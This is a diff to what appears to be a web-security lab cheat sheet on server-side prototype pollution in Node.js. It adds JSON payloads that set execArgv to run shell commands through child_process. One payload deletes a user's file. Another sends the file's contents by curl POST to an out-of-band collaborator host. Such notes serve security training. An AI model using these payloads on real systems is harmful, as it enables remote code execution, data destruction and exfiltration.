@@ -3320,13 +3320,25 @@ wrtz{{#with "s" as |string|}}
 
 Inject exploit in to read or delete user sensitive data. After injection, trigger new spawned node child processes, by using admin panel maintenance jobs button. This will action on Carlos `secret` file.  
 
+To Delete
 ```JSON
 "__proto__": {
     "execArgv":[
         "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
     ]
 }
+
 ```  
+To Read : Direct POST (if outgoing connections are allowed)
+This sends the raw content via POST. Cleaner and great for multi-line output, but slightly more detectable.
+
+```JSON
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('curl -X POST -d @/home/carlos/morale.txt https://OASTIFY.COM')"
+    ]
+}
+```
 
 ![SSPP JSON injection](images/sspp.png)  
 
